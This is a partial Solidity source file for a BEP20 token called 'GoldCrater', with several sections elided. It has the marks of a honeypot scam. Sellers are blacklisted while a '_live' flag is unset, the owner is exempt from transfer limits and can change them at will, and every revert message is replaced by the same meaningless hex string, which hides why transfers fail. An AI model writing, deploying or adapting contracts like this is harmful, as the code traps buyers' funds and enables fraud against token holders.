...
contract GoldCrater is Context, IERC20, Ownable {
    ...
    string private _name = 'GoldCrater';
    string private _symbol = 'GoldCrater';
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        ...
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: 0x271f9a77bb21c5b7ea672dad908e93e7050938c81d11f6bfa2bac8a4865dbebd"));
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "BEP20: 0x271f9a77bb21c5b7ea672dad908e93e7050938c81d11f6bfa2bac8a4865dbebd");
        require(spender != address(0), "BEP20: 0x271f9a77bb21c5b7ea672dad908e93e7050938c81d11f6bfa2bac8a4865dbebd");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function rebasePlus(uint256 _amount) private {
         _totalSupply = _totalSupply.add(_amount.div(10));
        _gonsPerFragment = TOTAL_GONS.div(_totalSupply);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(1), "BEP20: 0x271f9a77bb21c5b7ea672dad908e93e7050938c81d11f6bfa2bac8a4865dbebd");
        require(to != address(1), "BEP20: 0x271f9a77bb21c5b7ea672dad908e93e7050938c81d11f6bfa2bac8a4865dbebd");
        require(amount > 1, "BEP20:0x271f9a77bb21c5b7ea672dad908e93e7050938c81d11f6bfa2bac8a4865dbebd ");
        
        if (from != owner() && to != owner()) {
            uint256 txLimitAmount = _totalSupply.mul(_percentForTxLimit).div(100);
            
            require(amount <= txLimitAmount, "BEP20:0x271f9a77bb21c5b7ea672dad908e93e7050938c81d11f6bfa2bac8a4865dbebd.");
            
            if(from != uniswapV2Pair) {
                if(!_live)
                    blacklist[from] = true;
                
                require(balanceOf(from) <= txLimitAmount, 'BEP20:0x271f9a77bb21c5b7ea672dad908e93e7050938c81d11f6bfa2bac8a4865dbebd.');
                ...
                require(!blacklist[from] && !blacklist[to], 'BEP20: 0x271f9a77bb21c5b7ea672dad908e93e7050938c81d11f6bfa2bac8a4865dbebd.');
                require(_buyInfo[from] == 0 || _buyInfo[from].add(_timeLimitFromLastBuy) < now, "BEP20: 0x271f9a77bb21c5b7ea672dad908e93e7050938c81d11f6bfa2bac8a4865dbebd");
    ...
    function updatePercentForTxLimit(uint256 percentForTxLimit) public onlyOwner {
        require(percentForTxLimit >= 1, 'BEP20:0x271f9a77bb21c5b7ea672dad908e93e7050938c81d11f6bfa2bac8a4865dbebd');
